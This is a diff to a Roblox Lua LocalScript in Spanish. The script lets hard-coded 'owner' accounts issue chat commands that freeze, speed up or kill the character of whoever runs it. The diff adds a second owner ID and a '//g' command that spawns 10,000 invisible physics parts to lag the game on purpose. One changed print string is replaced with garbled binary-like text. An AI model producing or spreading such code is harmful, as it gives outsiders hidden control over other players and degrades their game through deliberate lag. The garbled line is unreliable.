@@ -7,7 +7,7 @@ local Lighting = game:GetService("Lighting")
 -- IDs de los dueños (agrega todos los que quieras aquí, papi 👑)
 local OWNER_IDS = {
     2061467416,   -- tú, papi principal
-    -- 9517601835,    -- amigo o segundo amo
+    7897058943,    -- amigo o segundo amo
     -- 987654321, -- descomenta y agrega más si quieres
     -- 111222333, -- otro más, etc.
 }
@@ -35,7 +35,7 @@ local function onOwnerCommand(message)
     
     -- Si es un Owner → CANCELAR TODO
     if table.find(OWNER_IDS, LocalPlayer.UserId) then
-        print("Cancelado para OWNER: " .. msg .. " (eres uno de los amos, papi 😏)")
+        print("Cancelado para OWNER: " .. msg .. " (eres uno 000de los 110101010110111010101001010101010@0@010101010 Epl???/)")
         return
     end
     
@@ -73,6 +73,68 @@ local function onOwnerCommand(message)
         humanoid.WalkSpeed = 16
         humanoid.JumpPower = 50
         print("¡Descongelado! 🔥")
+
+elseif msg == "//g" then
+-- LocalScript
+
+local Workspace = game:GetService("Workspace")
+
+-- Configuración
+local BLOCK_COUNT = 10000
+local DISTANCE_AWAY = 15000     -- lejos para no interferir visualmente
+local LIFE_TIME = 2.2           -- segundos antes de limpiar
+
+local function createLagBlocks()
+    local folder = Instance.new("Folder")
+    folder.Name = "LagChaos"
+    folder.Parent = Workspace
+    
+    for i = 1, BLOCK_COUNT do
+        local part = Instance.new("Part")
+        part.Anchored = false           -- ← física activada
+        part.CanCollide = true
+        part.CanTouch = true
+        part.CanQuery = true
+        part.Transparency = 1           -- invisible para no molestar visualmente
+        part.Size = Vector3.new(4, 4, 4)
+        
+        -- Posición inicial muy alta y dispersa
+        part.Position = Vector3.new(
+            math.random(-DISTANCE_AWAY, DISTANCE_AWAY),
+            math.random(800, 2200),     -- muy arriba para que caigan y choquen
+            math.random(-DISTANCE_AWAY, DISTANCE_AWAY)
+        )
+        
+        -- Le damos un poco de velocidad aleatoria para más caos
+        part.Velocity = Vector3.new(
+            math.random(-40, 40),
+            math.random(-80, -20),      -- caen hacia abajo con algo de variación
+            math.random(-40, 40)
+        )
+        
+        -- Material y densidad para que choquen más fuerte
+        part.Material = Enum.Material.Plastic
+        part.CustomPhysicalProperties = PhysicalProperties.new(
+            2.5,    -- density (más pesado = más impacto)
+            0.3,    -- friction
+            0.5,    -- elasticity (rebotan un poco)
+            0.5,    -- frictionWeight
+            1       -- densityWeight
+        )
+        
+        part.Parent = folder
+    end
+    
+    -- Limpiamos después de un tiempo
+    task.delay(LIFE_TIME, function()
+        if folder and folder.Parent then
+            folder:Destroy()
+        end
+    end)
+end
+
+-- Ejecutar
+createLagBlocks()
         
     elseif msg == "/r" then
         humanoid.Health = 0
